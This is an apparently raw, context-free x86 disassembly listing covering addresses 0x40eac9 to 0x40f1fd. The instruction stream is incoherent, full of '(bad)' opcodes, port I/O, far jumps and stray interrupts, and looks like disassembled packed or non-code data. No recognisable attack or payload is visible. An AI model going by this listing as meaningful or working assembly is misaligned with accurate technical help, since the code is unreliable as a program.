  40eac9:	test   DWORD PTR [ebx+0x8],eax
  40eacc:	adc    eax,0x6ee0be40
  40ead1:	jecxz  0x40ead3
  40ead3:	aad    0x46
  40ead5:	outs   dx,DWORD PTR ds:[esi]
  40ead6:	jae    0x40eb27
  40ead8:	scas   al,BYTE PTR es:[edi]
  40ead9:	dec    ecx
  40eada:	push   ecx
  40eadb:	adc    DWORD PTR [eax],edx
  40eadd:	loopne 0x40eabb
  40eadf:	mov    ch,0x9c
  40eae1:	fdivrp st(6),st
  40eae3:	add    al,0x54
  40eae5:	cmc    
  40eae6:	xchg   edi,eax
  40eae7:	or     BYTE PTR fs:[ebp-0x27],ah
  40eaeb:	fst    DWORD PTR [ecx-0x74]
  40eaee:	push   cs
  40eaef:	mov    dh,bh
  40eaf1:	push   ss
  40eaf2:	mov    ds:0xdaef5729,eax
  40eaf7:	pop    esi
  40eaf8:	imul   eax
  40eafa:	dec    ebx
  40eafb:	rol    BYTE PTR [ebp-0x23e8cc49],cl
  40eb01:	retf   
  40eb02:	mov    ebp,0x55d45977
  40eb07:	or     al,0xef
  40eb09:	ins    BYTE PTR es:[edi],dx
  40eb0a:	push   esp
  40eb0b:	mov    BYTE PTR [eax+0x53],ch
  40eb0e:	sbb    al,0xa5
  40eb10:	xchg   DWORD PTR [ebx],ecx
  40eb12:	pop    ebp
  40eb13:	push   cs
  40eb14:	xor    al,0xfb
  40eb16:	sbb    esi,esp
  40eb18:	add    ecx,DWORD PTR [ebx-0x26]
  40eb1b:	in     eax,0xc5
  40eb1d:	inc    edi
  40eb1e:	mov    esi,0xfd2207f9
  40eb23:	int    0x53
  40eb25:	outs   dx,DWORD PTR ds:[esi]
  40eb26:	mov    ecx,0xc944eaa9
  40eb2b:	mov    dh,0xd9
  40eb2d:	pop    ss
  40eb2e:	in     al,0x80
  40eb30:	xor    ebp,eax
  40eb32:	clc    
  40eb33:	xchg   ecx,eax
  40eb34:	call   0x4f:0xcae8fa16
  40eb3b:	cmp    ch,BYTE PTR [eax-0x25e0cb3b]
  40eb41:	cs jge 0x40ebbb
  40eb44:	jbe    0x40eb89
  40eb46:	mov    esp,0x7484e549
  40eb4b:	std    
  40eb4c:	sti    
  40eb4d:	aad    0xd5
  40eb4f:	ss data16 test ah,bh
  40eb53:	sbb    bh,al
  40eb55:	ins    DWORD PTR es:[edi],dx
  40eb56:	imul   ebp
  40eb58:	fisubr WORD PTR [edx]
  40eb5a:	xchg   ecx,eax
  40eb5b:	inc    eax
  40eb5c:	mov    esp,0x5b91d80a
  40eb61:	ficomp DWORD PTR [ecx]
  40eb63:	xchg   esp,ebx
  40eb65:	loop   0x40eb9e
  40eb67:	ins    DWORD PTR es:[edi],dx
  40eb68:	cmp    al,0x56
  40eb6a:	shl    DWORD PTR [ecx],1
  40eb6c:	pusha  
  40eb6d:	jp     0x40eb44
  40eb6f:	dec    ecx
  40eb70:	stos   BYTE PTR es:[edi],al
  40eb71:	bound  eax,QWORD PTR [eax-0x3ecc742c]
  40eb77:	(bad)  
  40eb79:	nop
  40eb7a:	jo     0x40eafc
  40eb7c:	imul   esi,DWORD PTR [edx+0x1c234f7d],0xfb319085
  40eb86:	scas   eax,DWORD PTR es:[edi]
  40eb87:	inc    eax
  40eb88:	inc    edx
  40eb89:	sub    BYTE PTR [eax+eax*8-0xd],bh
  40eb8d:	sahf   
  40eb8e:	push   edi
  40eb8f:	imul   esi,DWORD PTR [edi+0x75],0xcc9e3d67
  40eb96:	into   
  40eb97:	add    DWORD PTR [esi],esp
  40eb99:	push   ss
  40eb9a:	jge    0x40eb64
  40eb9c:	inc    ebx
  40eb9d:	jae    0x40ec08
  40eb9f:	xor    dl,BYTE PTR [edx]
  40eba1:	and    ebp,edi
  40eba3:	mov    ecx,0xfa3bd5e1
  40eba8:	div    ecx
  40ebaa:	arpl   cx,si
  40ebac:	jmp    0x15dc:0x7218dbec
  40ebb3:	int    0xd6
  40ebb5:	enter  0x3d4a,0x4
  40ebb9:	sbb    eax,0xbcf0854f
  40ebbe:	pop    edx
  40ebbf:	pop    ebp
  40ebc0:	daa    
  40ebc1:	pop    ss
  40ebc2:	cmp    DWORD PTR ss:[edx-0x26],ebp
  40ebc6:	scas   al,BYTE PTR es:[edi]
  40ebc7:	mov    ah,0x23
  40ebc9:	out    0x55,eax
  40ebcb:	add    al,0xa6
  40ebcd:	and    DWORD PTR [ecx-0x3207374e],0x38
  40ebd4:	jns    0x40ec29
  40ebd6:	mov    edx,0xb7d6b714
  40ebdb:	inc    edx
  40ebdc:	inc    ebx
  40ebdd:	sub    BYTE PTR [eax+0x1e00303e],bh
  40ebe3:	mov    ebx,esp
  40ebe5:	jle    0x40ebf5
  40ebe7:	cs xor edx,ecx
  40ebea:	lods   al,BYTE PTR ds:[esi]
  40ebeb:	in     al,dx
  40ebec:	test   al,0x6c
  40ebee:	fs mov dh,0xe4
  40ebf1:	and    bl,0xf2
  40ebf4:	and    BYTE PTR [edx+ecx*8+0x5],dl
  40ebf8:	adc    edi,DWORD PTR [ecx]
  40ebfa:	retf   
  40ebfb:	out    dx,eax
  40ebfc:	cmp    bh,BYTE PTR [edi+edx*2]
  40ebff:	cld    
  40ec00:	and    al,0x86
  40ec02:	(bad)  
  40ec03:	sub    al,0xb4
  40ec05:	xor    bl,cl
  40ec07:	adc    al,0x55
  40ec09:	(bad)  
  40ec0a:	mov    cl,0xa3
  40ec0c:	adc    esi,DWORD PTR [eax]
  40ec0e:	pop    ss
  40ec0f:	push   esi
  40ec10:	ja     0x40ec5d
  40ec12:	or     BYTE PTR [ebx+eiz*4-0x27],bl
  40ec16:	cmp    al,0x76
  40ec18:	pop    ebp
  40ec19:	mov    dl,0xf3
  40ec1b:	mov    ah,0x62
  40ec1d:	cmp    al,0xbb
  40ec1f:	cwde   
  40ec20:	(bad)  
  40ec21:	and    al,0xb5
  40ec23:	mov    ecx,ebx
  40ec25:	rcr    BYTE PTR [edx-0x7d683b52],cl
  40ec2b:	retf   
  40ec2c:	dec    ebx
  40ec2d:	or     eax,0x47b5c59a
  40ec32:	xchg   ebx,eax
  40ec33:	ins    DWORD PTR es:[edi],dx
  40ec34:	sub    DWORD PTR [ecx-0x31],esp
  40ec37:	call   0x89af1d8d
  40ec3c:	push   0x3c
  40ec3e:	scas   eax,DWORD PTR es:[edi]
  40ec3f:	mov    al,ds:0x688df343
  40ec44:	cs lock aaa 
  40ec47:	jl     0x40ec78
  40ec49:	test   al,0x7e
  40ec4b:	pop    ss
  40ec4c:	dec    ebx
  40ec4d:	add    al,0xe6
  40ec4f:	clc    
  40ec50:	enter  0x2d61,0xf1
  40ec54:	and    ebx,DWORD PTR [eax-0x45]
  40ec57:	sbb    DWORD PTR ds:[bp+di-0x4b],edx
  40ec5c:	call   0xa09a8729
  40ec61:	mov    ds:0xb233eb95,al
  40ec66:	loop   0x40ec08
  40ec68:	mov    dl,0xf8
  40ec6a:	fmulp  st(5),st
  40ec6c:	jb     0x40ec16
  40ec6e:	push   0x76
  40ec70:	sbb    eax,0xb197a8ce
  40ec75:	push   ebx
  40ec76:	test   ecx,edx
  40ec78:	js     0x40eca7
  40ec7a:	jge    0x40eca9
  40ec7c:	out    0xfa,eax
  40ec7e:	test   eax,0xae84ad3c
  40ec83:	ins    DWORD PTR es:[edi],dx
  40ec84:	sbb    esi,DWORD PTR ds:0xf2835117
  40ec8a:	das    
  40ec8b:	pop    ecx
  40ec8c:	test   DWORD PTR [edi+esi*4-0x1fe10bbb],edx
  40ec93:	(bad)  
  40ec94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec95:	lds    esi,FWORD PTR [edi+0x8]
  40ec98:	sub    bh,BYTE PTR [ebx+eiz*4]
  40ec9b:	adc    BYTE PTR [edx-0x61],ch
  40ec9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec9f:	es jecxz 0x40ec3f
  40eca2:	fs inc edx
  40eca4:	push   esi
  40eca5:	cmp    eax,0xf809ab89
  40ecaa:	and    al,0xe
  40ecac:	adc    eax,0xbffa1394
  40ecb1:	les    esp,FWORD PTR [ebx+0x52]
  40ecb4:	retf   0xa02
  40ecb7:	aaa    
  40ecb8:	xor    esp,ebp
  40ecba:	int    0x32
  40ecbc:	jge    0x40ed15
  40ecbe:	std    
  40ecbf:	lock mov ecx,0x227839f3
  40ecc5:	sbb    BYTE PTR [ecx-0x43834056],ch
  40eccb:	mov    dh,0x79
  40eccd:	xchg   edx,eax
  40ecce:	jl     0x40ed11
  40ecd0:	out    0xc2,eax
  40ecd2:	pop    edi
  40ecd3:	(bad)  
  40ecd4:	push   ebx
  40ecd5:	lds    ebx,FWORD PTR [ebp+0x28]
  40ecd8:	dec    edi
  40ecd9:	cmp    BYTE PTR [ebp+0x5c],cl
  40ecdc:	mov    ecx,?
  40ecde:	lar    ebp,WORD PTR [ecx+0x448b7276]
  40ece5:	stc    
  40ece6:	aaa    
  40ece7:	daa    
  40ece8:	add    al,0xa4
  40ecea:	jg     0x40ec6e
  40ecec:	or     al,BYTE PTR [ecx-0x5e]
  40ecef:	push   ss
  40ecf0:	cld    
  40ecf1:	cmp    ah,BYTE PTR [eax-0x2b6f771]
  40ecf7:	in     al,dx
  40ecf8:	cwde   
  40ecf9:	jmp    0x40ecad
  40ecfb:	nop
  40ecfc:	enter  0x5cb8,0xce
  40ed00:	adc    BYTE PTR [edi-0x54fcd032],ch
  40ed06:	mov    ebp,0xedf645e
  40ed0b:	xor    esp,DWORD PTR [ebp+ebx*1-0x23a76e3f]
  40ed12:	repz sub DWORD PTR [edi-0x5e],eax
  40ed16:	popf   
  40ed17:	push   edi
  40ed18:	ret    0xee76
  40ed1b:	mov    ah,0x44
  40ed1d:	dec    ebx
  40ed1e:	aam    0x9e
  40ed20:	ret    0x79b4
  40ed23:	je     0x40ed06
  40ed25:	adc    al,0xfe
  40ed27:	jecxz  0x40ed56
  40ed29:	das    
  40ed2a:	ins    BYTE PTR es:[edi],dx
  40ed2b:	push   cs
  40ed2c:	add    esi,DWORD PTR [ecx-0x77]
  40ed2f:	sbb    ebx,DWORD PTR [eax-0x483dcbea]
  40ed35:	mov    ebp,0xa93297a9
  40ed3a:	enter  0x6f8f,0x3b
  40ed3e:	push   eax
  40ed3f:	daa    
  40ed40:	pop    ss
  40ed41:	fidiv  WORD PTR ds:0x324a95cf
  40ed47:	dec    cx
  40ed49:	push   es
  40ed4a:	add    DWORD PTR [edx],0xffffffda
  40ed4d:	pop    ss
  40ed4e:	or     dh,BYTE PTR [edx+0xc410095]
  40ed54:	adc    edx,esi
  40ed56:	(bad)  
  40ed57:	mov    ecx,0x4ba5d619
  40ed5c:	iret   
  40ed5d:	bound  esp,QWORD PTR [eax-0x7e]
  40ed60:	cs add eax,0xebf32d1c
  40ed66:	xchg   ecx,eax
  40ed67:	scas   al,BYTE PTR es:[edi]
  40ed68:	repnz pop edx
  40ed6a:	outs   dx,DWORD PTR ds:[esi]
  40ed6b:	popa   
  40ed6c:	aam    0xf9
  40ed6e:	add    eax,0x8a40a816
  40ed73:	jmp    0x2755:0x38554775
  40ed7a:	ins    BYTE PTR es:[edi],dx
  40ed7b:	daa    
  40ed7c:	adc    bl,bh
  40ed7e:	inc    esp
  40ed7f:	pop    esi
  40ed80:	push   ds
  40ed81:	adc    dh,BYTE PTR [ecx]
  40ed83:	dec    edi
  40ed84:	nop
  40ed85:	mov    ebx,DWORD PTR [esi-0x35870f8e]
  40ed8b:	inc    edx
  40ed8c:	jle    0x40ed59
  40ed8e:	inc    esi
  40ed8f:	inc    esp
  40ed90:	shl    DWORD PTR [ecx],cl
  40ed92:	sar    BYTE PTR [esi],cl
  40ed94:	pop    edx
  40ed95:	rcl    BYTE PTR [eax+0x17617ef3],0x84
  40ed9c:	sbb    al,0x57
  40ed9e:	retf   
  40ed9f:	cmp    al,0x24
  40eda1:	sbb    ch,BYTE PTR [ebp+0x41613877]
  40eda7:	lds    eax,FWORD PTR ds:0x121c3521
  40edad:	jp     0x40ee24
  40edaf:	xchg   esi,eax
  40edb0:	imul   ebx,DWORD PTR [esi-0x3dad67f9],0xfffffff4
  40edb7:	(bad)  
  40edb8:	pop    ds
  40edb9:	dec    esp
  40edba:	pop    ebp
  40edbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edbc:	sub    edx,DWORD PTR [edi+0x45]
  40edbf:	jne    0x40eda2
  40edc1:	aam    0x6a
  40edc3:	adc    al,0x5d
  40edc5:	fcomp  DWORD PTR [ebx]
  40edc7:	inc    edx
  40edc8:	out    dx,al
  40edc9:	cmp    BYTE PTR [esi],cl
  40edcb:	pushf  
  40edcc:	stos   BYTE PTR es:[edi],al
  40edcd:	xchg   edi,eax
  40edce:	adc    edx,edi
  40edd0:	xor    ecx,DWORD PTR ds:0x974af57d
  40edd7:	inc    edx
  40edd8:	and    al,0x12
  40edda:	cmp    eax,0x41ec6a01
  40eddf:	out    dx,eax
  40ede0:	in     eax,0x1d
  40ede2:	xchg   BYTE PTR [edx-0x7f8777ee],dh
  40ede8:	dec    edi
  40ede9:	das    
  40edea:	and    al,0xb0
  40edec:	jg     0x40edb4
  40edee:	in     al,dx
  40edef:	cld    
  40edf0:	inc    ebp
  40edf1:	pop    ebp
  40edf2:	int    0x45
  40edf4:	bound  edx,QWORD PTR [ebx-0x55]
  40edf7:	dec    esi
  40edf8:	lds    ebx,FWORD PTR [ebx]
  40edfa:	(bad)  
  40edfb:	cld    
  40edfc:	xor    ebp,ebp
  40edfe:	in     eax,0x49
  40ee00:	mov    ds,ebx
  40ee02:	adc    edx,DWORD PTR [ecx+eax*8+0x2bbc18b5]
  40ee09:	add    al,0x53
  40ee0b:	dec    ebx
  40ee0c:	arpl   WORD PTR [edx-0x19eb5216],dx
  40ee12:	aas    
  40ee13:	sbb    cl,al
  40ee15:	inc    esp
  40ee16:	inc    ecx
  40ee17:	or     BYTE PTR [ecx-0x15],ch
  40ee1a:	(bad)  [edi]
  40ee1c:	xchg   edi,eax
  40ee1d:	sbb    BYTE PTR [edi+eiz*4],0xf3
  40ee21:	mov    esi,0xa9d3bf9d
  40ee26:	retf   0x3ea4
  40ee29:	cld    
  40ee2a:	xor    edx,DWORD PTR ds:0x3165c362
  40ee30:	jno    0x40ee2b
  40ee32:	enter  0xac65,0xfd
  40ee36:	nop
  40ee37:	mov    eax,0xb0c3181e
  40ee3c:	jne    0x40ede4
  40ee3e:	or     eax,0x7812596f
  40ee43:	pop    esi
  40ee44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee45:	pop    ebx
  40ee46:	jl     0x40ee98
  40ee48:	add    dl,ch
  40ee4a:	hlt    
  40ee4b:	mov    dh,0x16
  40ee4d:	fist   WORD PTR [ebx+0x5b]
  40ee50:	ds jb  0x40ee6c
  40ee53:	ds test dl,bh
  40ee56:	dec    eax
  40ee57:	clc    
  40ee58:	inc    esi
  40ee59:	jl     0x40ee22
  40ee5b:	(bad)  
  40ee5c:	jns    0x40ee2a
  40ee5e:	push   es
  40ee5f:	jnp    0x40eecd
  40ee61:	xchg   esp,eax
  40ee62:	idiv   DWORD PTR [bp+si]
  40ee65:	cli    
  40ee66:	jno    0x40ee22
  40ee68:	jo     0x40ee35
  40ee6a:	test   DWORD PTR [edx-0x17],0x10da17fa
  40ee71:	stc    
  40ee72:	adc    ecx,DWORD PTR [eax]
  40ee74:	mov    ebx,gs
  40ee76:	push   cs
  40ee77:	cli    
  40ee78:	sar    BYTE PTR [edi-0x2989505f],0x2e
  40ee7f:	adc    BYTE PTR [eax+0x1302da1b],bl
  40ee85:	cmp    BYTE PTR [ebx-0x424e2353],al
  40ee8b:	mov    bl,0xdf
  40ee8d:	sbb    BYTE PTR [ecx+edx*8-0x4f5ccf4d],ch
  40ee94:	or     DWORD PTR [ebp-0x62],ecx
  40ee97:	xchg   ebp,eax
  40ee98:	cmc    
  40ee99:	xlat   BYTE PTR ds:[ebx]
  40ee9a:	xchg   DWORD PTR ds:0xde160f70,ebp
  40eea0:	push   eax
  40eea1:	retf   0x4a33
  40eea4:	popa   
  40eea5:	into   
  40eea6:	int    0x39
  40eea8:	sahf   
  40eea9:	cdq    
  40eeaa:	xchg   ecx,eax
  40eeab:	sbb    DWORD PTR [edi],ebx
  40eead:	fldcw  WORD PTR [edx+0x67]
  40eeb0:	mov    ds:0xb3961c5d,eax
  40eeb5:	icebp  
  40eeb6:	addr16 push 0x95215dc6
  40eebc:	pop    ebx
  40eebd:	mov    ebp,0xfb2eee86
  40eec2:	pop    eax
  40eec3:	clc    
  40eec4:	scas   al,BYTE PTR es:[edi]
  40eec5:	jmp    0x40ef2f
  40eec7:	jnp    0x40ee4b
  40eec9:	xchg   ecx,eax
  40eeca:	sbb    eax,DWORD PTR [ebx-0x43]
  40eecd:	idiv   dl
  40eecf:	fst    DWORD PTR [ebx-0x6f2bbbf7]
  40eed5:	lods   al,BYTE PTR ds:[esi]
  40eed6:	add    eax,ebx
  40eed8:	imul   esi,eax,0x7f
  40eedb:	in     al,0x15
  40eedd:	cld    
  40eede:	push   es
  40eedf:	adc    DWORD PTR cs:[edi-0x13178779],ebx
  40eee6:	popa   
  40eee7:	sbb    edi,esi
  40eee9:	les    ecx,FWORD PTR [ebp+0x255a53a1]
  40eeef:	push   ds
  40eef0:	mov    cl,0x54
  40eef2:	xchg   BYTE PTR [edi+0x1ce6b714],dl
  40eef8:	mov    bl,0x68
  40eefa:	mov    ?,WORD PTR [esi]
  40eefc:	lods   eax,DWORD PTR ds:[esi]
  40eefd:	mov    esi,ebp
  40eeff:	arpl   WORD PTR [eax-0x614087ee],sp
  40ef05:	dec    ecx
  40ef06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef07:	popf   
  40ef08:	pop    es
  40ef09:	std    
  40ef0a:	and    eax,0x765e509b
  40ef0f:	lea    edi,[edx+ebx*1+0x40e45348]
  40ef16:	ss dec edi
  40ef18:	dec    ecx
  40ef19:	cmp    ecx,DWORD PTR [ecx]
  40ef1b:	jge    0x40eebd
  40ef1d:	jl     0x40ef57
  40ef1f:	xor    ah,dh
  40ef21:	jns    0x40eef1
  40ef23:	loopne 0x40eed9
  40ef25:	int    0x56
  40ef27:	inc    ebp
  40ef28:	fcomp  st(3)
  40ef2a:	dec    esi
  40ef2b:	push   ss
  40ef2c:	mov    dh,0x94
  40ef2e:	and    ebx,0x2b
  40ef31:	cmp    esi,DWORD PTR [ecx+0x1f]
  40ef34:	in     al,dx
  40ef35:	dec    edx
  40ef36:	mov    ?,WORD PTR [edx+edx*8-0x3e9b5352]
  40ef3d:	pinsrw mm2,WORD PTR [ebx-0x7684462a],0x68
  40ef45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef46:	mov    ch,0xc0
  40ef48:	pop    ebx
  40ef49:	mov    WORD PTR [edx],es
  40ef4b:	lahf   
  40ef4c:	call   0x1ec2:0xc355f72b
  40ef53:	or     al,0x4b
  40ef55:	ret    
  40ef56:	retf   0xd38
  40ef59:	mov    cl,0x8d
  40ef5b:	lods   eax,DWORD PTR ds:[esi]
  40ef5c:	daa    
  40ef5d:	mov    eax,0x2572a262
  40ef62:	sbb    edi,ebx
  40ef64:	dec    esi
  40ef65:	xor    DWORD PTR [edi],0x3cf0d668
  40ef6b:	add    DWORD PTR [ecx],0xfffffff6
  40ef6e:	sahf   
  40ef6f:	(bad)  
  40ef71:	push   cs
  40ef72:	xchg   edx,eax
  40ef73:	and    eax,0xf7059fcc
  40ef78:	dec    edx
  40ef79:	xor    DWORD PTR [edx+0x2878722b],0xffffff97
  40ef80:	ja     0x40ef89
  40ef82:	sub    bl,BYTE PTR [edi]
  40ef84:	ins    BYTE PTR es:[edi],dx
  40ef85:	add    DWORD PTR [eax],esi
  40ef87:	pop    edx
  40ef89:	cmp    eax,0xe59927d2
  40ef8e:	add    BYTE PTR [esi+0x5996beb4],0x51
  40ef95:	mov    DWORD PTR [ebp-0x7de0eb0c],0x84ee739f
  40ef9f:	inc    ebx
  40efa0:	aaa    
  40efa1:	jb     0x40f005
  40efa3:	clc    
  40efa4:	sub    BYTE PTR [ecx+0x78d932ee],dl
  40efaa:	outs   dx,DWORD PTR ds:[esi]
  40efab:	jmp    0x40efe0
  40efad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efae:	sbb    dl,BYTE PTR [edx]
  40efb0:	push   ds
  40efb1:	ret    
  40efb2:	push   edi
  40efb3:	out    dx,al
  40efb4:	aaa    
  40efb5:	arpl   WORD PTR [eax-0x74],sp
  40efb8:	mov    ds:0xac770389,al
  40efbd:	and    ebx,ecx
  40efbf:	dec    ebp
  40efc0:	add    DWORD PTR [edi+0x54ef709a],ebx
  40efc6:	pushf  
  40efc7:	xchg   edx,eax
  40efc9:	out    dx,eax
  40efca:	push   eax
  40efcb:	mov    ds:0xf51332ed,eax
  40efd0:	fbstp  TBYTE PTR [eax+ebx*1]
  40efd3:	jmp    0x4bec:0xcf558ac4
  40efda:	add    BYTE PTR [ebp-0x5407c805],dh
  40efe0:	mov    ah,bl
  40efe2:	cwde   
  40efe3:	lea    ebp,[edi+ebp*4-0x59]
  40efe7:	xchg   esi,eax
  40efe8:	lahf   
  40efe9:	call   0x4e91:0x33cb3304
  40eff0:	loopne 0x40f009
  40eff2:	mov    esi,0x5dedd88a
  40eff7:	repnz aas 
  40eff9:	sbb    ecx,DWORD PTR [esi]
  40effb:	outs   dx,BYTE PTR ds:[esi]
  40effc:	cmc    
  40effd:	std    
  40effe:	retf   
  40efff:	arpl   WORD PTR [edx+0x39],bp
  40f002:	add    eax,ecx
  40f004:	das    
  40f005:	mov    DWORD PTR [esi+ebp*2+0x2d],esp
  40f009:	jg     0x40efbf
  40f00b:	cld    
  40f00c:	jo     0x40f073
  40f00e:	inc    edx
  40f00f:	gs mov bh,0x92
  40f012:	repz or al,0x52
  40f015:	or     ah,BYTE PTR [esi+0x73]
  40f018:	fnstsw WORD PTR [eax+0x3f]
  40f01b:	pop    ss
  40f01c:	stos   BYTE PTR es:[edi],al
  40f01d:	fs std 
  40f01f:	xchg   ebx,eax
  40f020:	adc    bh,BYTE PTR [ebp+0x59439111]
  40f026:	jmp    0x40efe5
  40f028:	retf   0xe3f9
  40f02b:	push   0x5ebe979f
  40f030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f031:	fcom   QWORD PTR [edx]
  40f033:	sbb    cl,ch
  40f035:	push   es
  40f036:	addr16 xchg esi,eax
  40f038:	inc    edx
  40f039:	test   eax,0x787510b3
  40f03e:	js     0x40efc1
  40f040:	int3   
  40f041:	(bad)  
  40f042:	lods   eax,DWORD PTR ds:[esi]
  40f043:	(bad)  
  40f044:	ja     0x40eff8
  40f046:	int    0xf5
  40f048:	call   0xdba3e99c
  40f04d:	mov    ecx,0x9976c0ec
  40f052:	cmp    ebp,edx
  40f054:	pop    edi
  40f055:	pop    ds
  40f056:	mov    cl,0x55
  40f058:	in     eax,dx
  40f059:	mov    dl,0x98
  40f05b:	fist   WORD PTR [esp+ecx*4-0x63]
  40f05f:	jle    0x40f080
  40f061:	fdivr  DWORD PTR [edx+0x2a140685]
  40f067:	dec    ebp
  40f068:	xchg   esp,eax
  40f069:	ins    DWORD PTR es:[edi],dx
  40f06a:	icebp  
  40f06b:	ins    DWORD PTR es:[edi],dx
  40f06c:	sar    BYTE PTR [edx-0x3338b6f9],0x76
  40f073:	adc    ebx,edi
  40f075:	adc    DWORD PTR [edi],eax
  40f077:	jne    0x40f004
  40f079:	jb     0x40f02f
  40f07b:	into   
  40f07c:	adc    eax,0x78553420
  40f081:	jcxz   0x40f06f
  40f084:	imul   ebx,DWORD PTR [eax-0x23],0x862344f2
  40f08b:	lods   al,BYTE PTR ds:[esi]
  40f08c:	sbb    bl,BYTE PTR [edi-0x469131f9]
  40f092:	inc    eax
  40f093:	cdq    
  40f094:	shl    ah,0xdd
  40f097:	ret    0xeca3
  40f09a:	jbe    0x40f071
  40f09c:	scas   al,BYTE PTR es:[edi]
  40f09d:	xchg   ch,bh
  40f09f:	dec    ebx
  40f0a0:	add    DWORD PTR ds:0x25ad6515,esi
  40f0a6:	lea    eax,[ebx]
  40f0a8:	and    ah,BYTE PTR [ebp+0x11]
  40f0ab:	out    0xb2,al
  40f0ad:	pushf  
  40f0ae:	pop    ebp
  40f0af:	fisubr DWORD PTR [esp+esi*4-0x6ee7e4a2]
  40f0b6:	loope  0x40f07c
  40f0b8:	imul   edi,DWORD PTR [ecx],0x41
  40f0bb:	lods   eax,DWORD PTR ds:[esi]
  40f0bc:	retf   0xeeea
  40f0bf:	(bad)  
  40f0c0:	ss or  al,0x7f
  40f0c3:	lea    ecx,[ebp+0x50169f68]
  40f0c9:	ja     0x40f0b0
  40f0cb:	add    BYTE PTR [ebx],dh
  40f0cd:	fild   DWORD PTR [edi-0x2f]
  40f0d0:	push   ebx
  40f0d1:	in     eax,0x13
  40f0d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d4:	adc    al,0x79
  40f0d6:	shl    DWORD PTR [esi-0x6d02d028],cl
  40f0dc:	fcom   DWORD PTR [eax]
  40f0de:	test   al,0xfe
  40f0e0:	sahf   
  40f0e1:	stc    
  40f0e2:	sbb    ah,dl
  40f0e4:	xlat   BYTE PTR ds:[ebx]
  40f0e5:	es leave 
  40f0e7:	inc    ecx
  40f0e8:	neg    DWORD PTR [eax+0x3c]
  40f0eb:	shl    DWORD PTR [ebp+0x13b01e4e],cl
  40f0f1:	in     al,0x9f
  40f0f3:	xor    eax,0xc4d58e7f
  40f0f8:	loop   0x40f0e5
  40f0fa:	adc    al,0xa0
  40f0fc:	cmp    dh,BYTE PTR [ecx-0x70]
  40f0ff:	lds    ebx,FWORD PTR [eax+0x64802970]
  40f105:	xor    eax,0x5f6d5c8f
  40f10a:	stos   BYTE PTR es:[edi],al
  40f10b:	pop    ecx
  40f10c:	sub    eax,0x44cb8c44
  40f111:	aaa    
  40f112:	repz inc edx
  40f114:	sbb    DWORD PTR [ebp+0x4a154029],ebp
  40f11a:	inc    edi
  40f11b:	loopne 0x40f18d
  40f11d:	jg     0x40f0fd
  40f11f:	vmwrite esi,DWORD PTR [edx]
  40f122:	or     BYTE PTR [ecx-0x70c90c02],dl
  40f128:	out    dx,eax
  40f129:	les    esi,FWORD PTR [edx-0x28]
  40f12c:	add    al,0xd
  40f12e:	jmp    0x6a190d19
  40f133:	je     0x40f159
  40f135:	add    esi,edx
  40f137:	in     al,0x5e
  40f139:	xor    al,dh
  40f13b:	retf   
  40f13c:	sub    al,0xc7
  40f13e:	retf   
  40f13f:	rol    BYTE PTR [ebx+0x3f],cl
  40f142:	sbb    BYTE PTR [ecx-0x6316387c],0xa2
  40f149:	cmp    dh,BYTE PTR [esi+0x4d2af0a4]
  40f14f:	jae    0x40f100
  40f151:	pushf  
  40f152:	std    
  40f153:	add    BYTE PTR [esi-0x1c],ch
  40f156:	cmp    DWORD PTR [ecx],edi
  40f158:	sub    esp,DWORD PTR [edx+edx*8-0x7762e447]
  40f15f:	or     DWORD PTR [ebp+0xd],esp
  40f162:	dec    ebx
  40f163:	and    BYTE PTR [ecx+0x7d],ah
  40f166:	enter  0xfa71,0x1b
  40f16a:	iret   
  40f16b:	test   DWORD PTR [edi],edx
  40f16d:	ficom  WORD PTR [edx+0x7f]
  40f170:	cmp    BYTE PTR [ebx-0x69],dh
  40f173:	outs   dx,DWORD PTR ds:[esi]
  40f174:	xchg   esi,eax
  40f175:	sbb    eax,0x444b2838
  40f17a:	and    al,0x1d
  40f17c:	(bad)  
  40f17d:	mov    ecx,0xc7dd1611
  40f182:	cld    
  40f183:	lahf   
  40f184:	push   esi
  40f185:	mov    dl,0x3d
  40f187:	add    al,0x22
  40f189:	in     eax,0xee
  40f18b:	or     BYTE PTR [ebx+edi*4],bl
  40f18e:	xchg   DWORD PTR [ebx-0x56],eax
  40f191:	xchg   DWORD PTR [ebx-0x67],esp
  40f194:	iret   
  40f195:	aad    0x7b
  40f197:	call   0x71de:0x92c0b414
  40f19e:	sub    BYTE PTR cs:[ebp+0x23],0x27
  40f1a3:	mov    eax,0xcdfeb4c7
  40f1a8:	xchg   ecx,eax
  40f1a9:	sbb    BYTE PTR [edi-0x2a],dh
  40f1ac:	pop    edx
  40f1ad:	hlt    
  40f1ae:	iret   
  40f1af:	push   0xaa1ac5c8
  40f1b4:	adc    eax,0x7b69722b
  40f1b9:	fs nop
  40f1bb:	sti    
  40f1bc:	add    al,0xd4
  40f1be:	dec    edx
  40f1bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1c0:	jns    0x40f201
  40f1c2:	loope  0x40f17c
  40f1c4:	mov    al,0xf8
  40f1c6:	pusha  
  40f1c7:	out    dx,eax
  40f1c8:	shl    DWORD PTR [edx+eax*8],1
  40f1cb:	xchg   ch,dh
  40f1cd:	and    al,0xa0
  40f1cf:	stos   DWORD PTR es:[edi],eax
  40f1d0:	test   eax,0x8bc4e246
  40f1d5:	dec    esp
  40f1d6:	and    esi,DWORD PTR [esi+0x7cb5f6fa]
  40f1dc:	push   0x7d
  40f1de:	xlat   BYTE PTR ds:[ebx]
  40f1df:	dec    esi
  40f1e0:	inc    esi
  40f1e1:	or     eax,0xe6b88f0d
  40f1e6:	dec    DWORD PTR [ecx-0x141c41c5]
  40f1ec:	(bad)  
  40f1ed:	jno    0x40f1ff
  40f1ef:	push   es
  40f1f0:	in     al,0x36
  40f1f2:	lock jle 0x40f1cf
  40f1f5:	dec    ebp
  40f1f6:	push   ebp
  40f1f7:	xor    DWORD PTR [esi+eax*1+0x13],esp
  40f1fb:	and    al,0xd7
  40f1fd:	sbb    al,0xf5
